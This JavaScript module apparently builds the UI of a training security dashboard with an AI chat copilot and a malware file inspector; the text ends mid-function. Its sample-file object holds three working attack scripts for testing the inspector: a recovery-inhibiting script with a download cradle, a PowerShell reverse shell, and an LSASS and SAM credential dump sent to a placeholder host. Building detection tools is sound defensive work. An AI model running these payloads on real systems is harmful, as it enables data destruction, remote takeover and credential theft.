/**
 * ai.js — AI Cyber Copilot & Malware Threat Inspector for Velocities SI
 * Powered by OpenAI-compatible endpoint (RadoxAI / DeepSeek)
 * Features:
 * 1. Autonomous Cyber Copilot & Real-Time Incident Triage
 * 2. AI Malware & File Threat Inspector (Checks if files contain viruses or are dangerous)
 */
'use strict';

import {
  getAIConfig,
  saveAIConfig,
  getApiKey,
  saveApiKey,
  maskApiKey,
  callOpenAI,
  fetchAvailableModels,
  triageAllActiveIncidents,
  triageIncidentAI,
  calculateSHA256,
  calculateEntropy,
  scanHeuristics,
  analyzeFileThreatAI
} from '../modules/ai.js';
import { getMeta, saveMeta, appendAudit } from '../modules/store.js';
import { scoreToBand } from '../modules/risk.js';
import { esc, showToast } from '../modules/ui.js';

let _activeTab = 'copilot'; // 'copilot' | 'inspector'

let _chatHistory = [
  {
    role: 'assistant',
    content: `**VELOCITIES SI // AUTONOMOUS CYBER COPILOT ACTIVE**
Connected to OpenAI-compatible endpoint. Ready for incident triage, forensic analysis, and defensive orchestration.
Click any quick command above or submit a custom investigation query.`
  }
];

// Current file inspector state
let _inspectedFile = null;
let _inspectorResult = null;
let _isAnalyzingFile = false;

// Sample files for instant demonstration
const SAMPLE_FILES = {
  ransomware: {
    name: 'lock_inhibit_recovery.ps1',
    content: `# Ransomware Recovery Inhibitor Payload
Write-Host "Inhibiting recovery mechanisms..."
vssadmin.exe delete shadows /all /quiet
wbadmin.exe delete catalog -quiet
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/payload.bin')"))
powershell.exe -w hidden -enc $enc
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "VaultLocker" /t REG_SZ /d "C:\\Windows\\Temp\\locker.exe" /f`,
  },
  c2beacon: {
    name: 'stager_c2_beacon.ps1',
    content: `# In-Memory C2 Stager & Download Cradle
$client = New-Object System.Net.Sockets.TCPClient("203.0.113.15", 443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}`,
  },
  lsass: {
    name: 'token_impersonate.bat',
    content: `@echo off
echo [*] Dumping credential tokens...
powershell -nop -exec bypass -c "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full"
reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save
powershell -Command "Invoke-WebRequest -Uri 'http://198.51.100.42/exfil' -Method POST -InFile 'C:\\Windows\\Temp\\lsass.dmp'"`,
  },
  benign: {
    name: 'system_health_check.bat',
    content: `@echo off
REM Benign Diagnostic Health Script
echo Checking disk space and system memory...
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic logicaldisk get caption, freespace, size
ipconfig /all
echo System diagnostics complete. Log saved to C:\\Logs\\health.txt.`,
  }
};

export async function renderAI(container) {
  const cfg = getAIConfig();
  const apiKey = getApiKey();
  const maskedKey = maskApiKey(apiKey);
  const meta = getMeta();
  const incidents = meta.incidents || [];
  const maxScore = incidents.length ? Math.max(...incidents.map(i => i.risk || 0)) : 0;
  const risk = { score: maxScore, ...scoreToBand(maxScore) };

  container.innerHTML = `
    <div class="ai-view-shell">
      <!-- Top HUD Ribbon -->
      <div class="hud-ribbon">
        <div class="hud-col">
          <span class="hud-label">NEURAL ENGINE</span>
          <span class="hud-value font-mono glow-text" id="ai-active-model">${esc(cfg.model)}</span>
        </div>
        <div class="hud-divider"></div>
        <div class="hud-col">
          <span class="hud-label">BASE URL</span>
          <span class="hud-value font-mono text-muted">${esc(cfg.baseUrl)}</span>
        </div>
        <div class="hud-divider"></div>
        <div class="hud-col">
          <span class="hud-label">API KEY STATUS</span>
          <span class="hud-value font-mono ${apiKey ? 'text-white' : 'text-amber'}">
            ${apiKey ? '● CONFIGURED (' + maskedKey + ')' : '○ NOT SET'}
          </span>
        </div>
        <div class="hud-divider"></div>
        <div class="hud-col hud-right">
          <button id="ai-btn-config" class="btn btn-sm btn-outline font-mono">
            ⚙ SETTINGS & MODELS
          </button>
        </div>
      </div>

      <!-- Main Navigation Tabs -->
      <div class="ai-tab-bar font-mono" role="tablist">
        <button id="tab-btn-copilot" class="ai-tab-btn ${_activeTab === 'copilot' ? 'active' : ''}" role="tab" aria-selected="${_activeTab === 'copilot'}">
          ⚡ CYBER DEFENSE COPILOT
        </button>
        <button id="tab-btn-inspector" class="ai-tab-btn ${_activeTab === 'inspector' ? 'active' : ''}" role="tab" aria-selected="${_activeTab === 'inspector'}">
          🛡️ MALWARE & FILE THREAT INSPECTOR
          <span class="badge-new-pill">NEW</span>
        </button>
      </div>

      <!-- TAB 1: COPILOT CONTENT -->
      <div id="ai-view-copilot" class="ai-tab-content ${_activeTab === 'copilot' ? 'active' : 'hidden'}">
        <!-- Quick Command Bar -->
        <div class="ai-command-strip">
          <button id="ai-cmd-triage-all" class="btn btn-hero btn-sm">
            ⚡ TRIAGE ACTIVE INCIDENTS (${incidents.length})
          </button>
          <button id="ai-cmd-chain" class="btn btn-hero btn-sm">
            🔍 CORRELATE ATTACK CHAIN
          </button>
          <button id="ai-cmd-mitre" class="btn btn-hero btn-sm">
            🛡️ MAP MITRE ATT&CK
          </button>
          <button id="ai-cmd-ping" class="btn btn-outline btn-sm">
            📡 TEST CONNECTION
          </button>
          <button id="ai-cmd-clear" class="btn btn-ghost btn-sm text-dim">
            CLEAR FEED
          </button>
        </div>

        <!-- Main Layout: Chat / Analysis Feed -->
        <div class="ai-main-grid">
          <div class="panel ai-feed-panel">
            <div class="panel-header d-flex justify-between items-center">
              <div class="d-flex items-center gap-2">
                <span class="pulse-dot"></span>
                <h2 class="panel-title font-mono">INTELLIGENCE FEED // STREAM</h2>
              </div>
              <span class="text-dim font-mono text-xs">MODEL: ${esc(cfg.model)}</span>
            </div>

            <div id="ai-chat-feed" class="ai-chat-feed">
              ${renderMessagesHtml(_chatHistory)}
            </div>

            <!-- Prompt Input Form -->
            <form id="ai-chat-form" class="ai-input-form">
              <div class="ai-input-wrapper">
                <span class="ai-prompt-symbol font-mono">❯</span>
                <textarea 
                  id="ai-user-input" 
                  class="ai-textarea font-mono" 
                  rows="2" 
                  placeholder="Ask Velocities AI about threat indicators, attack vectors, or custom queries (e.g. 'How do I contain lateral movement from 198.51.100.42?')..." 
                  required></textarea>
                <button type="submit" id="ai-send-btn" class="btn btn-primary font-mono ai-send-btn">
                  <span>EXECUTE</span>
                  <span class="btn-bracket-corner"></span>
                </button>
              </div>
              <div class="ai-input-footer font-mono text-xs text-dim">
                <span>Shift+Enter for newline · Real-time inference via RadoxAI</span>
                <span id="ai-status-indicator">READY</span>
              </div>
            </form>
          </div>

          <!-- Sidebar / Context Inspector -->
          <div class="ai-context-panel">
            <div class="panel">
              <div class="panel-header">
                <h3 class="panel-title font-mono text-sm">ACTIVE TELEMETRY SNAPSHOT</h3>
              </div>
              <div class="p-3 font-mono text-xs">
                <div class="d-flex justify-between py-1 border-b border-subtle">
                  <span class="text-dim">Calculated Risk:</span>
                  <b class="text-white">${risk ? risk.score : 0}/100</b>
                </div>
                <div class="d-flex justify-between py-1 border-b border-subtle">
                  <span class="text-dim">Active Incidents:</span>
                  <span class="${incidents.length ? 'text-amber' : 'text-white'}">${incidents.length}</span>
                </div>
                <div class="d-flex justify-between py-1 border-b border-subtle">
                  <span class="text-dim">Critical Alerts:</span>
                  <span class="text-red">${incidents.filter(i => i.severity === 'critical').length}</span>
                </div>
                <div class="d-flex justify-between py-1">
                  <span class="text-dim">Active Scenario:</span>
                  <span class="text-white">${meta.simState?.scenario || 'S1 (Credential compromise)'}</span>
                </div>
              </div>
            </div>

            <!-- Pre-tuned Playbooks -->
            <div class="panel mt-3">
              <div class="panel-header">
                <h3 class="panel-title font-mono text-sm">PRE-TUNED PLAYBOOKS</h3>
              </div>
              <div class="p-2 d-flex flex-column gap-2">
                <button class="ai-preset-chip" data-prompt="Analyze the top critical incident in the workspace (INC-2025-001). Provide MITRE techniques, affected systems, and a step-by-step containment checklist.">
                  ▶ Deep Triage Top Incident
                </button>
                <button class="ai-preset-chip" data-prompt="Draft a Sigma detection rule to catch the brute-force and credential stuffing pattern observed in our synthetic logs.">
                  ▶ Generate Sigma Detection Rule
                </button>
                <button class="ai-preset-chip" data-prompt="Evaluate our risk weights and formula. Are there any blindspots based on current telemetry?">
                  ▶ Review Defense Posture
                </button>
                <button class="ai-preset-chip" data-prompt="Explain the difference between S1 Multi-stage Ransomware and S2 Credential Stuffing scenarios in technical detail.">
                  ▶ Scenario Attack Breakdown
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- TAB 2: MALWARE & FILE THREAT INSPECTOR -->
      <div id="ai-view-inspector" class="ai-tab-content ${_activeTab === 'inspector' ? 'active' : 'hidden'}">
        <div class="file-inspector-shell">
          <!-- Overview Banner -->
          <div class="inspector-banner font-mono">
            <div class="d-flex items-center gap-3">
              <span class="inspector-badge">STATIC & NEURAL SANDBOX</span>
              <h2 class="inspector-title">AI Malware & File Threat Inspector</h2>
            </div>
            <p class="inspector-subtitle">
              Inspect suspicious scripts, binaries, and payloads. Calculates cryptographic SHA-256 hashes,
              evaluates Shannon Entropy for packing/obfuscation, and runs neural LLM static analysis to detect viruses,
              backdoors, and dangerous capabilities.
            </p>
          </div>

          <!-- Quick Test Samples Strip -->
          <div class="inspector-samples-strip font-mono">
            <span class="samples-label text-dim">LOAD TEST PAYLOAD:</span>
            <button class="btn-sample-file" data-sample="ransomware">
              💣 Ransomware Inhibit (PS1)
            </button>
            <button class="btn-sample-file" data-sample="c2beacon">
              ⚡ CobaltStrike C2 Beacon (PS1)
            </button>
            <button class="btn-sample-file" data-sample="lsass">
              💉 Token Impersonation (BAT)
            </button>
            <button class="btn-sample-file" data-sample="benign">
              🟢 Clean Diagnostics (BAT)
            </button>
          </div>

          <!-- Main Inspector Grid -->
          <div class="inspector-grid">
            <!-- Left: Dropzone & File Input -->
            <div class="panel inspector-input-panel">
              <div class="panel-header font-mono">
                <span class="panel-title">TARGET PAYLOAD / FILE INPUT</span>
              </div>

              <!-- Drag and drop zone -->
              <div id="file-drop-zone" class="file-drop-zone">
                <input type="file" id="file-upload-input" class="sr-only" />
                <div class="dropzone-content font-mono">
                  <div class="drop-icon">📁</div>
                  <strong class="text-white">DRAG & DROP FILE HERE</strong>
                  <span class="text-dim text-xs">or click to browse local files (.exe, .dll, .ps1, .bat, .sh, .py, .js)</span>
                </div>
              </div>

              <!-- Or paste script textarea -->
              <div class="p-3">
                <label for="raw-script-input" class="font-mono text-xs text-dim d-block mb-1">
                  OR PASTE RAW SCRIPT / COMMAND LINE TO INSPECT:
                </label>
                <textarea 
                  id="raw-script-input" 
                  class="input input-full font-mono text-xs raw-script-textarea" 
                  rows="8" 
                  placeholder="# Paste PowerShell, Bash, Batch, or Base64 script here to inspect..."></textarea>
                
                <div class="d-flex justify-between items-center mt-3">
                  <span id="file-meta-summary" class="font-mono text-xs text-dim">No file loaded</span>
                  <button id="btn-run-inspection" class="btn btn-hero btn-md font-mono" ${_inspectedFile ? '' : 'disabled'}>
                    🔬 RUN AI THREAT INSPECTION
                  </button>
                </div>
              </div>
            </div>

            <!-- Right: Forensics & Deep Verdict Panel -->
            <div class="panel inspector-result-panel">
              <div class="panel-header font-mono d-flex justify-between items-center">
                <span class="panel-title">FORENSIC TELEMETRY & VERDICT</span>
                <span id="analysis-status-pill" class="status-pill status-ready">IDLE</span>
              </div>

              <div id="inspector-result-body" class="p-3 font-mono">
                ${renderInspectorResultHtml()}
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Config Dialog / Drawer -->
      <dialog id="ai-config-dialog" class="ai-config-modal">
        <div class="dialog-shell">
          <div class="dialog-header">
            <h2 class="dialog-title font-mono">AI ENGINE CONFIGURATION</h2>
            <button id="ai-close-config" class="btn-icon-close" aria-label="Close">✕</button>
          </div>
          <div class="dialog-content font-mono text-sm">
            <div class="form-group mb-3">
              <label for="ai-cfg-base-url" class="form-label text-dim">OPENAI BASE URL</label>
              <input type="text" id="ai-cfg-base-url" class="input input-full font-mono" value="${esc(cfg.baseUrl)}" placeholder="https://radoxai.com/v1" />
              <small class="text-dim">Default: https://radoxai.com/v1</small>
            </div>

            <div class="form-group mb-3">
              <label for="ai-cfg-model" class="form-label text-dim">MODEL</label>
              <div class="d-flex gap-2">
                <input type="text" id="ai-cfg-model" class="input input-full font-mono" value="${esc(cfg.model)}" list="ai-models-list" />
                <datalist id="ai-models-list">
                  <option value="deepseek-v4-flash-0731">
                  <option value="deepseek-v4-pro-0813">
                  <option value="gpt-5.6-luna">
                  <option value="claude-sonnet-5">
                  <option value="claude-opus-5">
                  <option value="qwen3.8-max">
                  <option value="gemini-3.7-flash">
                  <option value="gemma-2-2b">
                </datalist>
                <button type="button" id="ai-btn-fetch-models" class="btn btn-outline btn-sm">Refresh</button>
              </div>
              <small class="text-dim">E.g. deepseek-v4-flash-0731, claude-sonnet-5, etc.</small>
            </div>

            <div class="form-group mb-3">
              <label for="ai-cfg-api-key" class="form-label text-dim">API KEY</label>
              <div class="d-flex gap-2">
                <input type="password" id="ai-cfg-api-key" class="input input-full font-mono" value="${esc(apiKey)}" placeholder="cc_..." />
                <button type="button" id="ai-toggle-key-vis" class="btn btn-outline btn-sm">Show</button>
              </div>
              <small class="text-dim">Stored locally in your browser. Never exposed or logged.</small>
            </div>

            <div class="d-flex justify-between mt-4">
              <button type="button" id="ai-btn-test-conn" class="btn btn-outline">Test Connection</button>
              <button type="button" id="ai-btn-save-cfg" class="btn btn-primary">Save Settings</button>
            </div>
          </div>
        </div>
      </dialog>
    </div>
  `;

  bindAIHandlers(container);
  bindInspectorHandlers(container);
}

function renderMessagesHtml(messages) {
  return messages.map((m, idx) => {
    const isUser = m.role === 'user';
    return `
      <div class="ai-msg ${isUser ? 'ai-msg-user' : 'ai-msg-assistant'}" id="msg-${idx}">
        <div class="ai-msg-header font-mono">
          <span class="ai-msg-badge">${isUser ? 'ANALYST // USER' : 'COPILOT // INFERENCE'}</span>
          <span class="ai-msg-time text-dim">${new Date().toLocaleTimeString()}</span>
        </div>
        <div class="ai-msg-body font-mono">
          ${formatMarkdownSimple(m.content)}
        </div>
      </div>
    `;
  }).join('');
}

function renderInspectorResultHtml() {
  if (_isAnalyzingFile) {
    return `
      <div class="scanning-loader-box">
        <span class="pulse-dot"></span>
        <strong class="text-white">RUNNING DEEP FORENSIC INSPECTION...</strong>
        <p class="text-dim text-xs mt-2">
          Evaluating entropy metrics · Extracting suspicious API patterns · Querying RadoxAI DeepSeek Neural Sandbox...
        </p>
      </div>
    `;
  }

  if (!_inspectedFile) {
    return `
      <div class="empty-state font-mono py-8 text-center">
        <p class="text-dim">No target file loaded for inspection.</p>
        <small class="text-dim">Drag and drop a file or click one of the test payload buttons above.</small>
      </div>
    `;
  }

  const { filename, size, hash, entropy, heuristics } = _inspectedFile;
  const isHighEntropy = entropy > 7.0;

  let reportHtml = '';
  if (_inspectorResult) {
    reportHtml = `
      <div class="ai-verdict-card mt-4">
        <div class="verdict-banner-header">
          <span class="verdict-badge-tag font-mono">RADIXAI NEURAL VERDICT</span>
          <span class="verdict-model-tag font-mono">${esc(_inspectorResult.model || 'deepseek-v4-flash-0731')}</span>
        </div>
        <div class="verdict-content font-mono">
          ${formatMarkdownSimple(_inspectorResult.content)}
        </div>
        <div class="verdict-actions-strip mt-3 d-flex gap-2">
          <button id="btn-block-hash" class="btn btn-outline btn-sm font-mono" data-hash="${esc(hash)}">
            + ADD SHA-256 TO LAB BLOCKLIST
          </button>
          <button id="btn-create-incident-file" class="btn btn-hero btn-sm font-mono" data-file="${esc(filename)}">
            🚨 CREATE INCIDENT TICKET
          </button>
        </div>
      </div>
    `;
  }

  return `
    <!-- File Telemetry Card -->
    <div class="file-telemetry-card">
      <div class="telemetry-row">
        <span class="label text-dim">TARGET FILENAME:</span>
        <b class="value text-white">${esc(filename)}</b>
      </div>
      <div class="telemetry-row">
        <span class="label text-dim">FILE SIZE:</span>
        <span class="value text-white">${size.toLocaleString()} bytes</span>
      </div>
      <div class="telemetry-row">
        <span class="label text-dim">SHA-256 HASH:</span>
        <code class="value hash-code">${esc(hash)}</code>
      </div>
      <div class="telemetry-row">
        <span class="label text-dim">SHANNON ENTROPY:</span>
        <span class="value ${isHighEntropy ? 'text-red' : 'text-white'}">
          ${entropy} / 8.0 ${isHighEntropy ? '⚠️ HIGH (Likely packed or encrypted)' : '✓ NORMAL'}
        </span>
      </div>
    </div>

    <!-- Static Heuristics Findings -->
    <div class="heuristics-box mt-3">
      <span class="text-xs text-dim d-block mb-1 font-bold">STATIC HEURISTIC FINDINGS (${heuristics.length}):</span>
      ${heuristics.length ? heuristics.map(h => `
        <div class="heuristic-chip heuristic-${h.severity}">
          <span class="heuristic-sev">[${h.severity.toUpperCase()}]</span>
          <span>${esc(h.desc)}</span>
        </div>
      `).join('') : '<span class="text-xs text-dim">No static heuristic signatures matched.</span>'}
    </div>

    <!-- AI Verdict Output -->
    ${reportHtml}
  `;
}

function formatMarkdownSimple(text) {
  let html = esc(text);
  // Bold **text**
  html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
  // Headings
  html = html.replace(/^### (.*?)$/gm, '<h4 class="font-bold text-white mt-3 mb-1">$1</h4>');
  html = html.replace(/^## (.*?)$/gm, '<h3 class="font-bold text-white text-md mt-4 mb-2 border-b border-subtle pb-1">$1</h3>');
  // Inline code `code`
  html = html.replace(/`(.*?)`/g, '<code class="code-inline">$1</code>');
  // Lists
  html = html.replace(/^\s*• (.*?)$/gm, '<li class="ml-4">• $1</li>');
  html = html.replace(/^\s*\d+\.\s*(.*?)$/gm, '<li class="ml-4">$1</li>');
  // Newlines
  html = html.replace(/\n\n/g, '<p class="my-2"></p>');
  html = html.replace(/\n/g, '<br/>');
  return html;
}

function bindAIHandlers(container) {
  const feed = container.querySelector('#ai-chat-feed');
  const form = container.querySelector('#ai-chat-form');
  const textarea = container.querySelector('#ai-user-input');
  const statusInd = container.querySelector('#ai-status-indicator');
  const sendBtn = container.querySelector('#ai-send-btn');
  const dialog = container.querySelector('#ai-config-dialog');

  // Tab switching
  container.querySelector('#tab-btn-copilot')?.addEventListener('click', () => {
    _activeTab = 'copilot';
    renderAI(container);
  });
  container.querySelector('#tab-btn-inspector')?.addEventListener('click', () => {
    _activeTab = 'inspector';
    renderAI(container);
  });

  // Scroll feed to bottom
  if (feed) feed.scrollTop = feed.scrollHeight;

  // Handle textarea enter to submit
  textarea?.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      form?.dispatchEvent(new Event('submit'));
    }
  });

  // Handle submit query
  form?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const query = textarea.value.trim();
    if (!query) return;

    textarea.value = '';
    _chatHistory.push({ role: 'user', content: query });
    feed.innerHTML = renderMessagesHtml(_chatHistory);
    feed.scrollTop = feed.scrollHeight;

    statusInd.textContent = 'GENERATING INFERENCE...';
    sendBtn.disabled = true;

    try {
      const res = await callOpenAI({
        messages: _chatHistory.map(m => ({ role: m.role, content: m.content }))
      });

      _chatHistory.push({ role: 'assistant', content: res.content });
      statusInd.textContent = `COMPLETED (${res.model})`;
    } catch (err) {
      _chatHistory.push({
        role: 'assistant',
        content: `**API ERROR:** ${err.message}\n\nPlease check your Base URL and API key in settings.`
      });
      statusInd.textContent = 'ERROR';
    } finally {
      sendBtn.disabled = false;
      feed.innerHTML = renderMessagesHtml(_chatHistory);
      feed.scrollTop = feed.scrollHeight;
    }
  });

  // Quick command buttons
  container.querySelector('#ai-cmd-triage-all')?.addEventListener('click', async () => {
    const meta = getMeta();
    statusInd.textContent = 'TRIAGING INCIDENTS...';
    try {
      _chatHistory.push({ role: 'user', content: 'Provide an Executive Security Intelligence Assessment for all active incidents.' });
      feed.innerHTML = renderMessagesHtml(_chatHistory);
      feed.scrollTop = feed.scrollHeight;

      const res = await triageAllActiveIncidents(meta.incidents || []);
      _chatHistory.push({ role: 'assistant', content: res.content });
      statusInd.textContent = `COMPLETED (${res.model})`;
    } catch (e) {
      showToast('Triage failed: ' + e.message, 'error');
    } finally {
      feed.innerHTML = renderMessagesHtml(_chatHistory);
      feed.scrollTop = feed.scrollHeight;
    }
  });

  container.querySelector('#ai-cmd-chain')?.addEventListener('click', async () => {
    textarea.value = 'Correlate our active detections into an end-to-end Attack Chain hypothesis aligned with MITRE ATT&CK.';
    form.dispatchEvent(new Event('submit'));
  });

  container.querySelector('#ai-cmd-mitre')?.addEventListener('click', async () => {
    textarea.value = 'Map all current incidents and telemetry in the workspace to MITRE ATT&CK tactics (Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Impact).';
    form.dispatchEvent(new Event('submit'));
  });

  container.querySelector('#ai-cmd-ping')?.addEventListener('click', async () => {
    statusInd.textContent = 'TESTING CONNECTION...';
    try {
      const res = await callOpenAI({ messages: [{ role: 'user', content: 'Ping. Confirm connectivity in 1 sentence.' }] });
      showToast(`Connected to ${res.model}!`, 'success');
      _chatHistory.push({ role: 'assistant', content: `**CONNECTION TEST PASSED:** Connected to \`${res.model}\` via RadoxAI.` });
      feed.innerHTML = renderMessagesHtml(_chatHistory);
      feed.scrollTop = feed.scrollHeight;
    } catch (e) {
      showToast('Connection test failed: ' + e.message, 'error');
    } finally {
      statusInd.textContent = 'READY';
    }
  });

  container.querySelector('#ai-cmd-clear')?.addEventListener('click', () => {
    _chatHistory = [
      {
        role: 'assistant',
        content: `**INTELLIGENCE FEED CLEARED**\nReady for new queries or file threat investigations.`
      }
    ];
    feed.innerHTML = renderMessagesHtml(_chatHistory);
  });

  // Preset chips
  container.querySelectorAll('.ai-preset-chip').forEach(btn => {
    btn.addEventListener('click', () => {
      textarea.value = btn.dataset.prompt;
      form.dispatchEvent(new Event('submit'));
    });
  });

  // Config modal
  container.querySelector('#ai-btn-config')?.addEventListener('click', () => {
    dialog?.showModal();
  });
  container.querySelector('#ai-close-config')?.addEventListener('click', () => {
    dialog?.close();
  });

  container.querySelector('#ai-toggle-key-vis')?.addEventListener('click', (e) => {
    const input = container.querySelector('#ai-cfg-api-key');
    if (input.type === 'password') {
      input.type = 'text';
      e.target.textContent = 'Hide';
    } else {
      input.type = 'password';
      e.target.textContent = 'Show';
    }
  });

  container.querySelector('#ai-btn-fetch-models')?.addEventListener('click', async () => {
    const btn = container.querySelector('#ai-btn-fetch-models');
    btn.textContent = '...';
    try {
      const models = await fetchAvailableModels();
      const datalist = container.querySelector('#ai-models-list');
      datalist.innerHTML = models.map(m => `<option value="${esc(m)}">`).join('');
      showToast(`Loaded ${models.length} models`, 'success');
    } catch (e) {
      showToast('Could not fetch models: ' + e.message, 'error');
    } finally {
      btn.textContent = 'Refresh';
    }
  });

  container.querySelector('#ai-btn-test-conn')?.addEventListener('click', async () => {
    const baseUrl = container.querySelector('#ai-cfg-base-url').value.trim();
    const model = container.querySelector('#ai-cfg-model').value.trim();
    const apiKey = container.querySelector('#ai-cfg-api-key').value.trim();
    saveAIConfig({ baseUrl, model });
    saveApiKey(apiKey);

    try {
      const res = await callOpenAI({ messages: [{ role: 'user', content: 'Ping' }] });
      showToast(`Success! Connected to ${res.model}`, 'success');
    } catch (e) {
      showToast(`Connection failed: ${e.message}`, 'error');
    }
  });

  container.querySelector('#ai-btn-save-cfg')?.addEventListener('click', () => {
    const baseUrl = container.querySelector('#ai-cfg-base-url').value.trim();
    const model = container.querySelector('#ai-cfg-model').value.trim();
    const apiKey = container.querySelector('#ai-cfg-api-key').value.trim();
    saveAIConfig({ baseUrl, model });
    saveApiKey(apiKey);
    dialog.close();
    showToast('AI Settings updated successfully', 'success');
    renderAI(container);
  });
}

function bindInspectorHandlers(container) {
  const dropZone = container.querySelector('#file-drop-zone');
  const fileInput = container.querySelector('#file-upload-input');
  const rawTextarea = container.querySelector('#raw-script-input');
  const runBtn = container.querySelector('#btn-run-inspection');
  const metaSummary = container.querySelector('#file-meta-summary');
  const statusPill = container.querySelector('#analysis-status-pill');

  // Click on dropzone opens file dialog
  dropZone?.addEventListener('click', () => {
    fileInput?.click();
  });

  // Drag and drop events
  dropZone?.addEventListener('dragover', (e) => {
    e.preventDefault();
    dropZone.classList.add('drag-over');
  });
  dropZone?.addEventListener('dragleave', () => {
    dropZone.classList.remove('drag-over');
  });
  dropZone?.addEventListener('drop', async (e) => {
    e.preventDefault();
    dropZone.classList.remove('drag-over');
    const file = e.dataTransfer?.files?.[0];
    if (file) await handleFileSelected(file, container);
  });

  fileInput?.addEventListener('change', async (e) => {
    const file = e.target.files?.[0];
    if (file) await handleFileSelected(file, container);
  });

  // Pre-loaded sample buttons
  container.querySelectorAll('.btn-sample-file').forEach(btn => {
    btn.addEventListener('click', async () => {
      const sampleKey = btn.dataset.sample;
      const sample = SAMPLE_FILES[sampleKey];
      if (!sample) return;

      rawTextarea.value = sample.content;
      await processTextPayload(sample.name, sample.content, container);
    });
  });

  // Textarea typing update
  rawTextarea?.addEventListener('input', async () => {
    const val = rawTextarea.value.trim();
    if (val.length > 5) {
      await processTextPayload('pasted_script.ps1', val, container);
    }
  });

  // Run AI Inspection
  runBtn?.addEventListener('click', async () => {
    if (!_inspectedFile) return;

    _isAnalyzingFile = true;
    if (statusPill) {
      statusPill.textContent = 'SCANNING';
      statusPill.className = 'status-pill status-warn';
    }
    const resultBody = container.querySelector('#inspector-result-body');
    if (resultBody) resultBody.innerHTML = renderInspectorResultHtml();

    try {
      const res = await analyzeFileThreatAI({
        filename: _inspectedFile.filename,
        size: _inspectedFile.size,
        hash: _inspectedFile.hash,
        entropy: _inspectedFile.entropy,
        sampleContent: _inspectedFile.content,
        heuristics: _inspectedFile.heuristics
      });

      _inspectorResult = res;
      if (statusPill) {
        statusPill.textContent = 'ANALYZED';
        statusPill.className = 'status-pill status-success';
      }
    } catch (e) {
      showToast('AI Threat Analysis failed: ' + e.message, 'error');
      if (statusPill) {
        statusPill.textContent = 'FAILED';
        statusPill.className = 'status-pill status-danger';
      }
    } finally {
      _isAnalyzingFile = false;
      if (resultBody) resultBody.innerHTML = renderInspectorResultHtml();
      bindVerdictActionButtons(container);
    }
  });
}

async function handleFileSelected(file, container) {
  const buffer = await file.arrayBuffer();
  const uint8 = new Uint8Array(buffer);
  const textContent = new TextDecoder('utf-8', { fatal: false }).decode(uint8);

  const hash = await calculateSHA256(buffer);
  const entropy = calculateEntropy(uint8);
  const heuristics = scanHeuristics(textContent, file.name);

  _inspectedFile = {
    filename: file.name,
    size: file.size,
    hash,
    entropy,
    heuristics,
    content: textContent
  };
  _inspectorResult = null;

  updateInspectorUI(container);
}

async function processTextPayload(filename, content, container) {
  const enc = new TextEncoder();
  const uint8 = enc.encode(content);
  const hash = await calculateSHA256(uint8.buffer);
  const entropy = calculateEntropy(uint8);
  const heuristics = scanHeuristics(content, filename);

  _inspectedFile = {
    filename,
    size: uint8.length,
    hash,
    entropy,
    heuristics,
    content
  };
  _inspectorResult = null;

  updateInspectorUI(container);
}

function updateInspectorUI(container) {
  const runBtn = container.querySelector('#btn-run-inspection');
  const metaSummary = container.querySelector('#file-meta-summary');
  const resultBody = container.querySelector('#inspector-result-body');

  if (runBtn) runBtn.disabled = false;
  if (metaSummary && _inspectedFile) {
    metaSummary.textContent = `${_inspectedFile.filename} (${_inspectedFile.size} B · SHA-256: ${_inspectedFile.hash.slice(0, 12)}...)`;
  }
  if (resultBody) {
    resultBody.innerHTML = renderInspectorResultHtml();
  }
  bindVerdictActionButtons(container);
}

function bindVerdictActionButtons(container) {
  container.querySelector('#btn-block-hash')?.addEventListener('click', (e) => {
    const hash = e.target.dataset.hash;
    appendAudit(`Added file SHA-256 hash to defense perimeter blocklist: ${hash}`, hash, 'threat_intel');
    showToast(`Hash ${hash.slice(0, 16)}... added to perimeter blocklist!`, 'success');
  });

  container.querySelector('#btn-create-incident-file')?.addEventListener('click', (e) => {
    const filename = e.target.dataset.file;
    const meta = getMeta();
    const newIncId = `INC-2025-00${(meta.incidents?.length || 0) + 1}`;
    const newInc = {
      id: newIncId,
      title: `Malware Detected: Suspicious payload in ${filename}`,
      host: 'lab-file-sandbox',
      user: 'unknown',
      ip: '198.51.100.88',
      status: 'New',
      priority: 'critical',
      severity: 'critical',
      risk: 92,
      owner: 'Analyst Alpha',
      correlationKey: `corr-${_inspectedFile?.hash.slice(0, 8)}`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      detectionIds: [],
      eventIds: [],
      hypothesis: `AI Threat Inspector flagged ${filename} with dangerous virus/exploit capabilities.`,
      mitreHypotheses: [
        { technique: 'T1204.002', name: 'Malicious File Execution', stage: 'Execution', ruleId: 'R-FILE' }
      ],
      inputs: { severity: 95, confidence: 90, assetImportance: 90, impact: 90, evidenceSupport: 90 },
      riskHistory: [{ ts: new Date().toISOString(), score: 92, before: 0, inputs: {}, formulaVersion: 1, rationale: 'Malware Inspector triage' }],
      notes: [{ ts: new Date().toISOString(), author: 'AI Threat Inspector', text: `SHA-256: ${_inspectedFile?.hash}` }]
    };

